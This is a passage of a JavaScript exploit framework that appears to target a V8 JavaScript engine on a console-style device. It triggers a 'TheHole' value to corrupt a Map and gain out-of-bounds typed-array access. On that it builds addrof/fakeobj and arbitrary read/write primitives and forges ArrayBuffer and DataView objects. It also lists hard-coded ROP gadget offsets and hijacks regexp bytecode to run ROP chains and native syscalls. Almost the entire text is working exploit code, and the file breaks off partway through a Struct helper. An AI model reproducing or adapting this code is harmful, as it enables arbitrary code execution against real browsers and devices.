//#region Constants
const fn = {};
const bf = new ArrayBuffer(8);
const fv = new Float64Array(bf);
const bv = new BigUint64Array(bf);

let pid = 0;
let version = {};
let eboot_base = 0n;
let libc_base = 0n;
let libkernal_base = 0n;
let syscall_wrapper = 0n;

const mem = {
  allocs: new Map(),
  /**
   * @param {number} size
   * @return {BigInt}
   */
  alloc(size) {
    const buf = new ArrayBuffer(size);
    const backing_store = buf.getBackingStore();
    this.allocs.set(backing_store, buf);
    return buf.getBackingStore();
  },
  /** @param {BigInt} addr */
  free(addr) {
    return this.allocs.delete(addr);
  },
  // to be used in try-finally to cleanup after scripts are done
  free_all() {
    this.allocs.clear();
  },
  /**
   * @param {BigInt} dst
   * @param {BigInt} src
   * @param {number} size
   */
  copy(dst, src, size) {
    const src_arr = new Uint8Array(ArrayBuffer.from(src, size));
    const dst_arr = new Uint8Array(ArrayBuffer.from(dst, size));

    dst_arr.set(src_arr);
  },
  /**
   * @param {BigInt} addr
   * @param {number} size
   */
  bset(addr, size, value = 0) {
    const arr = new Uint8Array(ArrayBuffer.from(addr, size));
    arr.fill(value);
  },
  /**
   * @param {BigInt} addr
   * @param {number} max
   */
  strlen(addr, max = 0x3fff) {
    const arr = new Uint8Array(ArrayBuffer.from(addr, max));

    let len = -1;
    for (let i = 0; i < max; i++) {
      if (arr[i] === 0) {
        len = i;
        break;
      }
    }

    return len;
  },
};

const arw = {
  leak_arr: new Array(0x20001), // kMaxRegularHeapObjectSize + 1 to keep in Large Object Space
  leak_view: new BigUint64Array(1), // rw into leak_lo_arr backing store
  fake_obj_arr: new Array(0x20001), // kMaxRegularHeapObjectSize + 1 to keep in Large Object Space
  fake_obj_view: new BigUint64Array(0x12), // JSArrayBuffer.map.instance_size = 9 + JSDataView.map.instance_size = 9
  fake_obj_arr_elements_data_addr: 0n,
  fake_buf_idx: 0,
  fake_view_idx: 9,
  /** @type {DataView} */
  fake_view: undefined,
  get fake_buf_addr() {
    return this.fake_obj_arr_elements_data_addr + (this.fake_buf_idx * BigUint64Array.BYTES_PER_ELEMENT).bigint();
  },
  get fake_view_addr() {
    return this.fake_obj_arr_elements_data_addr + (this.fake_view_idx * BigUint64Array.BYTES_PER_ELEMENT).bigint();
  },
  init() {
    logger?.info("Initiate ARW...");

    this.rw.init();

    this.make_leak();
    this.make_view();

    const fake_view = this.view(this.addrof(this.leak_arr));

    logger?.info(`Fake buffer view length: ${fake_view.byteLength}`);

    logger?.info("Achieved ARW !!");

    delete this.rw;
  },
  /**
   * @param {Object} obj
   * @return {BigInt}
   */
  addrof(obj) {
    this.leak_arr[0] = obj;
    return this.leak_view[0].untag();
  },
  /**
   * @param {BigInt} addr
   * @return {Object}
   */
  fakeobj(addr) {
    if (addr === 0n) {
      throw new RangeError("Empty addr !!");
    }

    this.leak_view[0] = addr.tag();
    return this.leak_arr[0];
  },
  /** @param {BigInt} addr */
  view(addr) {
    if (addr === 0n) {
      throw new RangeError("Empty addr !!");
    }

    this.fake_obj_view[this.fake_buf_idx + 4] = addr; // JSArrayBuffer.backing_store

    return this.fake_view;
  },
  make_leak() {
    const leak_arr_addr = this.rw.addrof(this.leak_arr);
    const leak_view_addr = this.rw.addrof(this.leak_view);
    const leak_view_buf_addr = this.rw.addrof(this.leak_view.buffer);

    logger?.debug(`leak_arr_addr: ${leak_arr_addr.hex()}`);
    logger?.debug(`leak_view_addr: ${leak_view_addr.hex()}`);
    logger?.debug(`leak_view_buf_addr: ${leak_view_buf_addr.hex()}`);

    const leak_arr_elements_addr = this.rw.read(leak_arr_addr + 0x10n).untag(); // JSObject.elements

    logger?.debug(`leak_arr_elements_addr: ${leak_arr_elements_addr.hex()}`);

    this.rw.write(leak_view_addr + 0x38n, leak_arr_elements_addr + 0x10n); // JSTypedArray.external_pointer = &FixedArray.objects[0]
  },
  make_view() {
    const fake_obj_arr_addr = this.rw.addrof(this.fake_obj_arr);
    const fake_obj_view_addr = this.rw.addrof(this.fake_obj_view);
    const fake_obj_view_buf_addr = this.rw.addrof(this.fake_obj_view.buffer);

    logger?.debug(`fake_obj_arr_addr: ${fake_obj_arr_addr.hex()}`);
    logger?.debug(`fake_obj_view_addr: ${fake_obj_view_addr.hex()}`);
    logger?.debug(`fake_obj_view_buf_addr: ${fake_obj_view_buf_addr.hex()}`);

    const fake_obj_arr_elements_addr = this.rw.read(fake_obj_arr_addr + 0x10n).untag(); // JSObject.elements

    logger?.debug(`fake_obj_arr_elements_addr: ${fake_obj_arr_elements_addr.hex()}`);

    this.fake_obj_arr_elements_data_addr = fake_obj_arr_elements_addr + 0x10n;

    logger?.debug(`fake_obj_arr_elements_data_addr: ${this.fake_obj_arr_elements_data_addr.hex()}`);

    this.rw.write(fake_obj_view_addr + 0x38n, this.fake_obj_arr_elements_data_addr); // JSTypedArray.external_pointer = &FixedArray.floats[0]

    const dummy_arr = [1.1];
    const dummy_arr_addr = this.addrof(dummy_arr);
    const dummy_arr_map_addr = this.rw.read(dummy_arr_addr);

    logger?.debug(`dummy_arr_addr: ${dummy_arr_addr.hex()}`);

    this.rw.write(fake_obj_arr_elements_addr, dummy_arr_map_addr); // FixedArray.map = JSArray.map

    // To avoid random GC crashes, crafted fake objects should have same size as JSObject.map.instance_size
    // which is (sizeof(uint64_t) * uint64_count) or else once GC scans object it will crash

    let i = 0;

    const dummy_view = new DataView(new ArrayBuffer(8));
    const dummy_view_addr = this.addrof(dummy_view);
    const dummy_view_buf_addr = this.addrof(dummy_view.buffer);

    // JSArrayBuffer.map.instance_size = 9
    this.fake_obj_view[i++] = this.rw.read(dummy_view_buf_addr); // JSArrayBuffer.map
    this.fake_obj_view[i++] = this.rw.read(dummy_view_buf_addr + 8n); // JSArrayBuffer.properties
    this.fake_obj_view[i++] = this.rw.read(dummy_view_buf_addr + 0x10n); // JSArrayBuffer.elements
    this.fake_obj_view[i++] = -1n; // JSArrayBuffer.byte_length
    this.fake_obj_view[i++] = 0n; // JSArrayBuffer.backing_store
    this.fake_obj_view[i++] = 0n; // JSArrayBuffer.extension
    this.fake_obj_view[i++] = 1n; // JSArrayBuffer.bit_field
    this.fake_obj_view[i++] = 0n; // JSArrayBuffer.padding
    this.fake_obj_view[i++] = 0n; // JSArrayBuffer.padding

    // JSDataView.map.instance_size = 9
    this.fake_obj_view[i++] = this.rw.read(dummy_view_addr); // JSDataView.map
    this.fake_obj_view[i++] = this.rw.read(dummy_view_addr + 8n); // JSDataView.properties
    this.fake_obj_view[i++] = this.rw.read(dummy_view_addr + 0x10n); // JSDataView.map
    this.fake_obj_view[i++] = this.fake_buf_addr.tag(); // JSDataView.buffer
    this.fake_obj_view[i++] = 0n; // JSDataView.byte_offset
    this.fake_obj_view[i++] = -1n; // JSDataView.byte_length
    this.fake_obj_view[i++] = 0n; // JSDataView.data_pointer
    this.fake_obj_view[i++] = 0n; // JSDataView.padding
    this.fake_obj_view[i++] = 0n; // JSDataView.padding

    this.fake_view = this.fakeobj(this.fake_view_addr);
  },
  rw: {
    /** @type {Map} */
    map: undefined,
    /** @type {Array<number>} */
    oob_view: undefined,
    rw_view: undefined,
    /** @type {Object[]} */
    obj_arr: undefined,
    init() {
      logger?.info("Initiate OOB...");

      const hole = this.make_hole();

      this.map = new Map();
      this.map.set(1, 1);
      this.map.set(hole, 1);
      this.map.delete(hole);
      this.map.delete(hole);
      this.map.delete(1);

      this.oob_view = new BigUint64Array(1);
      this.rw_view = new BigUint64Array(1);
      this.obj_arr = [{}];

      logger?.info(`OOB array length: ${this.oob_view.length}`);

      this.map.set(0x1e, -1);
      this.map.set(0, -1);

      logger?.info(`OOB array length: ${this.oob_view.length}`);

      this.oob_view[26] = this.oob_view[25]; // overwrite JSTypedArray.elements as undefined to force JSTypedArray.external_pointer

      const oob_view_addr = this.addrof(this.oob_view);
      const rw_view_addr = this.addrof(this.rw_view);
      const obj_arr_addr = this.addrof(this.obj_arr);

      logger?.debug(`oob_view_addr: ${oob_view_addr.hex()}`);
      logger?.debug(`rw_view_addr: ${rw_view_addr.hex()}`);
      logger?.debug(`obj_arr_addr: ${obj_arr_addr.hex()}`);

      logger?.info("Achieved OOB !!");
    },
    /**
     * @param {Object} obj
     * @return {BigInt}
     */
    addrof(obj) {
      this.obj_arr[0] = obj; // FixedArray.objects[0] = obj
      return this.oob_view[37].untag(); // FixedArray.objects[0]
    },
    /**
     * @param {BigInt} addr
     * @return {Object}
     */
    fakeobj(addr) {
      if (addr === 0n) {
        throw new RangeError("Empty addr !!");
      }

      this.oob_view[37] = addr.tag(); // &FixedArray.objects[0] = addr
      return this.obj_arr[0]; // FixedArray.objects[0]
    },
    /**
     * @param {BigInt} addr
     * @return {BigInt}
     */
    read(addr, untag = false) {
      this.oob_view[32] = (addr - 0x10n).tag(); // JSTypedArray.external_pointer = addr - offsetof(JSObject, elements);
      const value = this.rw_view[0]; // JSTypedArray.objects[0]
      return untag ? value.untag() : value;
    },
    /**
     * @param {BigInt} addr
     * @param {BigInt} value
     */
    write(addr, value, untag = false) {
      this.oob_view[32] = (addr - 0x10n).tag(); // JSTypedArray.external_pointer = addr - offsetof(JSObject, elements);
      this.rw_view[0] = untag ? value.untag() : value; // JSTypedArray.objects[0] = value
    },
    make_hole() {
      let v1;
      function f0(v4) {
        v4(
          () => {},
          (v5) => {
            v1 = v5.errors;
          },
        );
      }
      f0.resolve = function (v6) {
        return v6;
      };
      let v3 = {
        then(v7, v8) {
          v8();
        },
      };
      Promise.any.call(f0, [v3]);
      return v1[1];
    },
    make_hole_old() {
      let a = [];
      let b = [];
      let s = '"'.repeat(0x800000);
      a[20000] = s;

      for (let i = 0; i < 10; i++) a[i] = s;
      for (let i = 0; i < 10; i++) b[i] = a;

      try {
        JSON.stringify(b);
      } catch (hole) {
        return hole;
      }

      throw new Error("Could not trigger TheHole");
    },
  },
};

const gadgets = {
  get RET() {
    return eboot_base + 0x32n;
  },
  get LEAVE_RET() {
    return eboot_base + 0x4683d6n;
  },
  get POP_R8_RET() {
    return eboot_base + 0x1a8ff9n;
  },
  get POP_R9_RET() {
    return eboot_base + 0x1394e01n;
  },
  get POP_R10_RET() {
    return eboot_base + 0x111b281n;
  },
  get POP_R11_RET() {
    return eboot_base + 0x813444n;
  },
  get POP_R12_RET() {
    return eboot_base + 0x49f7en;
  },
  get POP_R13_RET() {
    return eboot_base + 0x146160n;
  },
  get POP_R14_RET() {
    return eboot_base + 0xb8a80n;
  },
  get POP_R15_RET() {
    return eboot_base + 0xb0ec4n;
  },
  get POP_RAX_RET() {
    return eboot_base + 0x2d954n;
  },
  get POP_RBP_RET() {
    return eboot_base + 0x69n;
  },
  get POP_RBX_RET() {
    return eboot_base + 0xa69cn;
  },
  get POP_RCX_RET() {
    return eboot_base + 0x187da3n;
  },
  get POP_RDI_RET() {
    return eboot_base + 0xb0ec5n;
  },
  get POP_RDX_RET() {
    return eboot_base + 0xb692n;
  },
  get POP_RSI_RET() {
    return eboot_base + 0xb8a81n;
  },
  get POP_RSP_RET() {
    return eboot_base + 0x49f7fn;
  },
  get XCHG_RBP_RAX_RET() {
    return eboot_base + 0x830140n;
  },
  get XCHG_RSP_RAX_RET() {
    return eboot_base + 0x1ef3fa4n;
  },
  get XCHG_RSI_RAX_RET() {
    return eboot_base + 0x1ef4064n;
  },
  get SUB_RDX_RAX_RET() {
    return eboot_base + 0x9a95b6n;
  },
  get MOV_RAX_QWORD_PTR_RAX_RET() {
    return eboot_base + 0x8aee8n;
  },
  get MOV_RAX_QWORD_PTR_RAX_8_RET() {
    return eboot_base + 0xdb21an;
  },
  get MOV_QWORD_PTR_RAX_60_RSI_RET() {
    return eboot_base + 0x820e29n;
  },
  get MOV_QWORD_PTR_R8_RAX_RET() {
    return eboot_base + 0x1fbc514n;
  },
  get MOV_RAX_QWORD_PTR_R8_RET() {
    return eboot_base + 0x1b458aan;
  },
  get CMOVB_RAX_RSI_RET() {
    return eboot_base + 0x982b90n;
  },
  get LOCK_XADD_QWORD_PTR_RDI_RAX_RET() {
    return eboot_base + 0xf130b9n;
  },
  get MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8() {
    return eboot_base + 0x25ae3n;
  },
  get PUSH_QWORD_PTR_RBP_RAX_F_MOV_BH_47_PUSH_RAX_RET() {
    return eboot_base + 0xaeec02n;
  },
  get POP_RBX_SUB_ECX_ECX_POP_RCX_ADD_RSP_RBX_PUSH_RCX_RET() {
    return eboot_base + 0xf9119cn;
  },
};

const rop = {
  /** @type {BCRegExp} */
  impl: undefined,
  /** @type {Stack} */
  stack: undefined,
  /** @type {Frame} */
  frame: undefined,
  insts: [],
  init() {
    logger?.info("Initiate ROP...");

    this.impl = new BCRegExp();
    this.stack = new Stack(0x2000);
    this.frame = new Frame(["rsp", "rbp", "rip", "rax", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);

    eboot_base = this.get_eboot_base();

    BCRegExp.disable_regexp_tier_up();

    this.frame.store(this.insts, "rsp");
    this.insts.push(gadgets.XCHG_RBP_RAX_RET);
    this.frame.store(this.insts, "rbp");

    this.insts.push(gadgets.POP_RAX_RET);
    this.frame.valueof(this.insts, "rax");

    this.insts.push(gadgets.POP_RDI_RET);
    this.frame.valueof(this.insts, "rdi");

    this.insts.push(gadgets.POP_RSI_RET);
    this.frame.valueof(this.insts, "rsi");

    this.insts.push(gadgets.POP_RDX_RET);
    this.frame.valueof(this.insts, "rdx");

    this.insts.push(gadgets.POP_RCX_RET);
    this.frame.valueof(this.insts, "rcx");

    this.insts.push(gadgets.POP_R8_RET);
    this.frame.valueof(this.insts, "r8");

    this.insts.push(gadgets.POP_R9_RET);
    this.frame.valueof(this.insts, "r9");

    this.frame.valueof(this.insts, "rip");
    this.frame.store(this.insts, "rax");

    this.frame.load(this.insts, "rbp");
    this.insts.push(gadgets.XCHG_RBP_RAX_RET);
    this.frame.load(this.insts, "rsp");
    this.insts.push(gadgets.XCHG_RSP_RAX_RET);

    logger?.info("Achieved ROP !!");
  },
  free() {
    this.stack.free();
    this.frame.free();
  },
  reset() {
    this.stack.reset();
    this.frame.reset();
  },
  /** @param {Array} insts */
  execute() {
    this.stack.prepare(this.insts, this.frame);

    this.impl.store_return();
    this.impl.set64_current(gadgets.POP_RAX_RET);
    this.impl.set64_current(this.stack.sp);
    this.impl.set64_current(gadgets.XCHG_RSP_RAX_RET);
    this.impl.set64_current(gadgets.POP_RAX_RET);
    this.impl.set64_current(0n);
    this.impl.set64_current(gadgets.POP_RBX_SUB_ECX_ECX_POP_RCX_ADD_RSP_RBX_PUSH_RCX_RET);
    this.impl.set64_current(-0x38n);
    this.impl.restore_return();
    this.impl.return_fail();
    this.impl.execute();
  },
  get_eboot_base() {
    const eboot_base_addr = mem.alloc(8);

    this.impl.store_return();
    this.impl.gadget_current(gadgets.POP_RAX_RET);
    this.impl.gadget_current(0n); // eboot_base
    this.impl.gadget_current(gadgets.POP_R8_RET);
    this.impl.set64_current(eboot_base_addr);
    this.impl.gadget_current(gadgets.MOV_QWORD_PTR_R8_RAX_RET);
    this.impl.gadget_current(gadgets.POP_RAX_RET);
    this.impl.set64_current(0n);
    this.impl.gadget_current(gadgets.POP_RBX_SUB_ECX_ECX_POP_RCX_ADD_RSP_RBX_PUSH_RCX_RET);
    this.impl.set64_current(-0x48n);
    this.impl.restore_return();
    this.impl.return_fail();
    this.impl.execute();

    const eboot_base = (gadgets.base = arw.view(eboot_base_addr).getBigUint64(0, true));

    mem.free(eboot_base_addr);

    return eboot_base;
  },
};
//#endregion
//#region Extensions
Number.prototype.bigint = function (double = false) {
  return double ? ((fv[0] = this), bv[0]) : BigInt(this);
};

Number.prototype.alignUp = function (alingment = 1) {
  const mask = alingment - 1;
  return (this + mask) & ~mask;
};

Number.prototype.alignDown = function (alingment = 1) {
  const mask = alingment - 1;
  return this & ~mask;
};

Number.prototype.hex = function (padded = false, maxLength = 16) {
  let str = this.toString(16).toUpperCase();

  if (padded) {
    str = str.padStart(maxLength, "0");
  }

  return `0x${str}`;
};

BigInt.prototype.number = function (double = false) {
  return double ? ((bv[0] = this), fv[0]) : Number(this.mask(64, true));
};

BigInt.prototype.ltoh = function () {
  return this << 0x20n;
};

BigInt.prototype.htol = function () {
  return this >> 0x20n;
};

BigInt.prototype.hi = function () {
  return this & ~0xffffffffn;
};

BigInt.prototype.lo = function () {
  return this & 0xffffffffn;
};

BigInt.prototype.mask = function (bits, signed = false) {
  return signed ? BigInt.asIntN(bits, this) : BigInt.asUintN(bits, this);
};

BigInt.prototype.alignUp = function (alingment = 1n) {
  const mask = alingment - 1n;
  return (this + mask) & ~mask;
};

BigInt.prototype.alignDown = function (alingment = 1n) {
  const mask = alingment - 1n;
  return this & ~mask;
};

BigInt.prototype.tag = function () {
  return this | 1n;
};

BigInt.prototype.untag = function () {
  return this & ~1n;
};

BigInt.prototype.hex = function (padded = true, maxLength = 16) {
  const value = this < 0n ? BigInt.asUintN(64, this) : this;
  let str = value.toString(16).toUpperCase();

  if (padded) {
    str = str.padStart(maxLength, "0");
  }

  return `0x${str}`;
};

String.prototype.cstr = function () {
  if (this.length === 0) return mem.alloc(1);

  const bytes = stob(this);

  const addr = mem.alloc(bytes.length + 1);

  mem.copy(addr, bytes.buffer.getBackingStore(), bytes.length);

  arw.view(addr).setUint8(bytes.length, 0);

  return addr;
};

// Only use after arw.init
ArrayBuffer.prototype.setBackingStore = function (addr) {
  const buf_addr = arw.addrof(this);
  arw.view(buf_addr).setBigUint64(0x20, addr, true); // JSArrayBuffer.backing_store
};

// Only use after arw.init
ArrayBuffer.prototype.getBackingStore = function () {
  const buf_addr = arw.addrof(this);
  return arw.view(buf_addr).getBigUint64(0x20, true); // JSArrayBuffer.backing_store
};
//#endregion
//#region Classes
class SyscallError extends Error {
  constructor(message) {
    super(`${message}\n\terrno ${errno()}: ${strerror()}`);
    this.name = "SyscallError";
  }
}

class Stack {
  /** @param {number} size */
  constructor(size) {
    if (size % BigUint64Array.BYTES_PER_ELEMENT !== 0) {
      throw new Error("Invalid stack size, not aligned by 8 bytes");
    }

    if (size < 0x1000) {
      throw new Error("Invalid stack size, minimal size is 0x1000 to init ROP");
    }

    this.view = new BigUint64Array(new ArrayBuffer(size));
    this.reset();
  }

  reset() {
    this.view.fill(0n);
    this.current = this.view.length;
  }

  get offset() {
    return this.current * BigUint64Array.BYTES_PER_ELEMENT;
  }

  get sp() {
    return this.view.buffer.getBackingStore() + this.offset.bigint();
  }

  /**
   * @param {Array} insts
   * @param {Frame} frame
   */
  prepare(insts, frame) {
    this.reset();

    for (let i = insts.length - 1; i >= 0; i--) {
      if (this.current < 1) {
        throw new Error("Stack full !!");
      }

      let inst = insts[i];

      if (typeof inst === "string") {
        if (typeof frame === "undefined") {
          throw new Error("Unable to resolve symbol without frame !!");
        }

        inst = frame.instof(inst);
      }

      this.view[--this.current] = inst;
    }
  }
}

class Frame {
  /** @param {Array} list */
  constructor(list) {
    if (!Array.isArray(list)) {
      throw new Error(`Input frame is not an array !!`);
    }

    if (list.length === 0) {
      throw new Error("Empty frame size");
    }

    this.view = new BigUint64Array(list.length);

    for (let i = 0; i < list.length; i++) {
      const name = list[i];

      if (typeof name !== "string") {
        throw new TypeError(`${name} not a string !!`);
      }

      if (name in this) {
        throw new Error(`Duplicated local variable ${name} !!`);
      }

      this[name] = i;
    }
  }

  reset() {
    this.view.fill(0n);
  }

  /** @param {string} name */
  instof(name) {
    let as_value = false;

    if (name.startsWith("[") && name.endsWith("]")) {
      name = name.slice(1, -1);
      as_value = true;
    }

    if (name in this) {
      return as_value ? this.get_value(name) : this.addrof(name);
    }

    throw new Error(`${name} not in frame !!`);
  }

  /** @param {string} name */
  addrof(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view.buffer.getBackingStore() + (this[name] * BigUint64Array.BYTES_PER_ELEMENT).bigint();
  }

  /** @param {string} name */
  get_value(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.view[this[name]];
  }

  /**
   * @param {string} name
   * @param {BigInt} value
   */
  set_value(name, value) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    this.view[this[name]] = value;
  }

  /**
   * @param {Array} insts
   * @param {string} name
   */
  valueof(insts, name) {
    insts.push(`[${name}]`);
  }

  /**
   * @param {Array} insts
   * @param {string} name
   */
  store(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_R8_RET);
    insts.push(name);
    insts.push(gadgets.MOV_QWORD_PTR_R8_RAX_RET);
  }

  /**
   * @param {Array} insts
   * @param {string} name
   */
  load(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_R8_RET);
    insts.push(name);
    insts.push(gadgets.MOV_RAX_QWORD_PTR_R8_RET);
  }

  /**
   * @param {Array} insts
   * @param {BigInt} gadget
   * @param {string} name
   */
  pop(insts, gadget, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    const store = this.addrof(name);
    const rbp = (store - gadget - 0xfn).mask(64, true);

    insts.push(gadgets.POP_RAX_RET);
    insts.push(gadget);
    insts.push(gadgets.POP_RBP_RET);
    insts.push(rbp);
    insts.push(gadgets.PUSH_QWORD_PTR_RBP_RAX_F_MOV_BH_47_PUSH_RAX_RET);
  }
}

class BCRegExp extends RegExp {
  static #str = "aaaaa";
  static #sp_reg = 0x54;
  static #return_reg = 0x52;
  static #return_store_reg = 3;
  static #tmp_store_reg = 5;
  static #bytecode = Object.freeze({
    BREAK: 0,
    PUSH_CP: 1,
    PUSH_BT: 2,
    PUSH_REGISTER: 3,
    SET_REGISTER_TO_CP: 4,
    SET_CP_TO_REGISTER: 5,
    SET_REGISTER_TO_SP: 6,
    SET_SP_TO_REGISTER: 7,
    SET_REGISTER: 8,
    ADVANCE_REGISTER: 9,
    POP_CP: 10,
    POP_BT: 11,
    POP_REGISTER: 12,
    FAIL: 13,
    SUCCEED: 14,
    ADVANCE_CP: 15,
  });

  constructor() {
    super(/[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g);

    const regex_addr = arw.addrof(this);
    logger?.debug(`regex_addr: ${regex_addr.hex()}`);

    const data_addr = arw.view(regex_addr).getBigUint64(0x18, true).untag(); // JSRegExp.data
    logger?.debug(`data_addr: ${data_addr.hex()}`);

    arw.view(data_addr).setBigUint64(0x60, -1n.ltoh(), true); // JSRegExp.data.TicksUntilTierUp : SMI (value << 0x20)

    this.exec(BCRegExp.#str);

    this.view = new Uint32Array(0x80);

    this.reset();
  }

  reset() {
    this.reg = BCRegExp.#return_reg;
    this.current = 0;
    this.view.fill(0);
  }

  flush() {
    const regex_addr = arw.addrof(this);
    const data_addr = arw.view(regex_addr).getBigUint64(0x18, true).untag(); // JSRegExp.data
    const latin1_bytecode_addr = arw.view(data_addr).getBigUint64(0x38, true).untag(); // JSRegExp.data.Latin1Bytecode
    const fixedarray_data_addr = latin1_bytecode_addr + 0x10n; // &FixedArray.data[0]

    mem.copy(fixedarray_data_addr, this.view.buffer.getBackingStore(), this.view.byteLength);
  }

  /** @param {number|BigInt} value */
  emit32(value) {
    if (this.current === this.view.length) {
      throw new Error("bytecode full !!");
    }

    this.view[this.current++] = Number(value);
  }

  /**
   * @param {number} op
   * @param {number} reg
   */
  emit_reg(op, reg) {
    this.emit32((reg << 8) | op);
  }

  /**
   * @param {number} reg
   * @param {BigInt} value
   */
  adv(reg, value) {
    this.emit_reg(BCRegExp.#bytecode.ADVANCE_REGISTER, reg);
    this.emit32(value);
  }

  /**
   * @param {number} reg
   * @param {BigInt} value
   */
  set(reg, value) {
    this.emit_reg(BCRegExp.#bytecode.SET_REGISTER, reg);
    this.emit32(value);
  }
  /**
   * @param {number} src
   * @param {number} dst
   */
  mov(src, dst) {
    this.emit_reg(BCRegExp.#bytecode.PUSH_REGISTER, src);
    this.emit_reg(BCRegExp.#bytecode.POP_REGISTER, dst);
  }

  /**
   * @param {number} reg
   * @param {BigInt} value
   */
  adv64(reg, value) {
    this.adv(reg, value.lo());
    this.adv(reg + 1, value.htol());
  }

  /**
   * @param {number} reg
   * @param {BigInt} value
   */
  set64(reg, value) {
    this.set(reg, value.lo());
    this.set(reg + 1, value.htol());
  }

  /**
   * @param {number} src
   * @param {number} dst
   */
  mov64(src, dst) {
    this.mov(src, dst);
    this.mov(src + 1, dst + 1);
  }

  /** @param {BigInt} value */
  adv_current(value) {
    this.adv(this.reg++, value);
  }

  /** @param {BigInt} value */
  set_current(value) {
    this.set(this.reg++, value);
  }

  /** @param {number} reg */
  mov_from_current(reg) {
    this.mov(this.reg++, reg);
  }

  /** @param {number} reg */
  mov_to_current(reg) {
    this.mov(reg, this.reg++);
  }

  /** @param {BigInt} value */
  adv64_current(value) {
    this.adv64(this.reg, value);
    this.reg += 2;
  }

  /** @param {BigInt} value */
  set64_current(value) {
    this.set64(this.reg, value);
    this.reg += 2;
  }

  /** @param {number} reg */
  mov64_from_current(reg) {
    this.mov64(this.reg, reg);
    this.reg += 2;
  }

  /** @param {number} reg */
  mov64_to_current(reg) {
    this.mov64(reg, this.reg);
    this.reg += 2;
  }

  /** @param {BigInt} gadget */
  gadget_current(gadget) {
    this.mov64(BCRegExp.#return_store_reg, BCRegExp.#tmp_store_reg);
    this.adv64(BCRegExp.#tmp_store_reg, (gadget + 0xfec231d1n).mask(32)); // ~0x13DCE2F (return address)

    this.mov64_to_current(BCRegExp.#tmp_store_reg);
  }

  store_return() {
    this.mov64(BCRegExp.#return_reg, BCRegExp.#return_store_reg);
  }

  restore_return() {
    this.mov64_to_current(BCRegExp.#return_store_reg);
  }

  return_succeed() {
    this.emit32(BCRegExp.#bytecode.SUCCEED);
  }

  return_fail() {
    this.emit32(BCRegExp.#bytecode.FAIL);
  }

  execute() {
    this.flush();
    this.exec(BCRegExp.#str);
    this.reset();
  }

  static disable_regexp_tier_up() {
    const FLAG_regexp_tier_up = arw.view(eboot_base).getUint8(0x2a7b212);
    if (FLAG_regexp_tier_up === 1) {
      arw.view(eboot_base).setUint8(0x2a7b212, 0);
    }
  }
}

class NativeFunction {
  constructor(input, ret) {
    this.ret = ret;

    if (typeof input === "bigint") {
      this.addr = input;
    } else if (typeof input === "number") {
      this.id = input.bigint();
      this.addr = syscall_wrapper;
    }
  }

  invoke() {
    if (arguments.length > 6) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    rop.reset();

    rop.frame.set_value("rip", this.addr);
    rop.frame.set_value("rax", this.id ?? 0n);

    const ctx = [];
    const regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];

    for (let i = 0; i < regs.length; i++) {
      const reg = regs[i];

      let value = arguments[i] ?? 0n;

      switch (typeof value) {
        case "bigint":
          break;
        case "boolean":
          value = value ? 1n : 0n;
          break;
        case "number":
          value = value.bigint();
          break;
        case "string":
          value = value.cstr();
          ctx.push(value);
          break;
        default:
          throw new Error(`Invalid value of type ${typeof value} at arg ${i}`);
      }

      rop.frame.set_value(reg, value);
    }

    rop.execute();

    while (ctx.length > 0) {
      mem.free(ctx.pop());
    }

    let result;
    if (this.ret) {
      result = rop.frame.get_value("rax");

      switch (this.ret) {
        case "bigint":
          result = result.mask(64, true);
          break;
        case "number":
          result = result.number();
          break;
        case "boolean":
          result = result !== 0n;
          break;
        case "string":
          result = String.from(result);
          break;
        default:
          throw new Error(`Unsupported return type ${this.ret}`);
      }
    }

    return result;
  }

  chain() {
    if (arguments.length < 1) {
      throw new Error("insts argument is required to chain with !!");
    }

    if (!Array.isArray(arguments[0])) {
      throw new Error(`insts argument is not an array !!`);
    }

    if (arguments.length > 7) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    const regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_RET];

    const insts = arguments[0];

    insts.push(gadgets.POP_RAX_RET);
    insts.push(this.id ?? 0n);

    for (let i = 1; i < arguments.length; i++) {
      const reg = regs[i - 1];

      insts.push(reg);

      let value = arguments[i];

      switch (typeof value) {
        case "bigint":
          break;
        case "boolean":
          value = value ? 1n : 0n;
          break;
        case "number":
          value = value.bigint();
          break;
        case "string":
          value = value.cstr();
          break;
        default:
          throw new Error(`Invalid value at arg ${i - 1}`);
      }

      insts.push(value);
    }

    insts.push(this.addr);
  }
}

class Struct {
  static registry = new Map();

  constructor(name, fields) {
    if (Struct.registry.has(name)) {
      return Struct.registry.get(name);
    }

    if (!Array.isArray(fields)) {
      throw new Error("Input fields is not an array !!");
    }

    if (fields.length === 0) {
      throw new Error("Empty fields array !!");
    }

    let offset = 0;
    let alignof = 1;

    for (const field of fields) {
      field.size = Struct.type_size(field.type);
      field.align = Struct.type_align(field.type);
      field.offset = offset = offset.alignUp(field.align);
      field.count = field.count ?? 1;

      offset += field.size * field.count;
      alignof = Math.max(alignof, field.align);
    }

    this.name = name;
    this.fields = Object.fromEntries(fields.map((f) => [f.name, f]));
    this.sizeof = offset.alignUp(alignof);
    this.alignof = alignof;

    logger?.debug(`registering ${this.name}: sizeof: ${this.sizeof}, alignof: ${this.alignof}`);

    Struct.registry.set(this.name, this);
  }

  new(addr) {
    const instance = { addr: addr ?? mem.alloc(this.sizeof), struct: this };
    return new Proxy(instance, {
      get: (target, prop) => {
        if (prop in target) return target[prop];

        if (!isNaN(prop)) {
          const i = Number(prop);
          return target.struct.new(target.addr + (i * target.struct.sizeof).bigint());
        }

        const field = target.struct.fields[prop];
        if (!field) return undefined;

        let type = field.type;
        let addr = target.addr + field.offset.bigint();

        if (field.count > 1) {
